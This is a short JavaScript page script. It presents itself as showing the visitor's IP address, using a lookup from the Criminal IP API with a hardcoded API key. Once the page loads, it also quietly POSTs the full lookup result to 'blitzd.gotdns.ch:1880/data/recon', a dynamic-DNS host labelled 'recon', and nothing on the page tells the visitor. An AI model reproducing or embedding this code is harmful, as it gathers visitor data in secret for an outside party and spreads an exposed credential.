document.addEventListener("DOMContentLoaded", function () {
            const apiKey = "f7MbyXpR0DB4eZ2OCmsDOkrXcWTgvA8KZN5zs92xeX6gQcSTIZnlTSlh8U7o";

            fetch("https://api.criminalip.io/v1/ip/data", {
                method: "POST",
                headers: {
                    "Authorization": `Bearer ${apiKey}`,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({})
            })
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;
                document.getElementById("ipDisplay").textContent = `IP Address: ${ipAddress}`;
                
                const xhr = new XMLHttpRequest();
                xhr.open("POST", "https://blitzd.gotdns.ch:1880/data/recon", true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify(data));
            })
            .catch(error => {
                console.error("Error:", error);
                document.getElementById("ipDisplay").textContent = "Failed to retrieve IP address";
            });
        });